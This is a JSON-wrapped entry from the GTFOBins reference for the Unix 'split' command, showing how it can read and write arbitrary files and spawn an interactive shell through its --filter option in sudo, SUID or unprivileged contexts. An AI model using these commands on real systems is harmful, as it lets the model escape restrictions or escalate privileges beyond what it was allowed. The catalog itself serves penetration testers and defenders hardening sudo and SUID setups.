{"title": "split", "source": "gtfobins", "source_label": "GTFOBins", "path": "split", "html": "<h1>split</h1>\n<h2>File Read</h2>\n<p>This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.</p>\n<pre><code class=\"language-bash\">split -b 999 --additional-suffix suffix /path/to/input-file prefix\ncat prefixaasuffix</code></pre>\n<h2>File Write</h2>\n<p>This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.</p>\n<pre><code class=\"language-bash\">split -b 999 --additional-suffix suffix /path/to/input-file prefix</code></pre>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">split --filter=&#x27;/bin/sh -i 0&lt;&amp;2 1&gt;&amp;2&#x27; /etc/hosts</code></pre>", "excerpt": "split File Read This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`. split -b 999 --additional-suffix suffix /path/to/input-file prefix cat…", "tags": ["func:file-read", "func:file-write", "func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}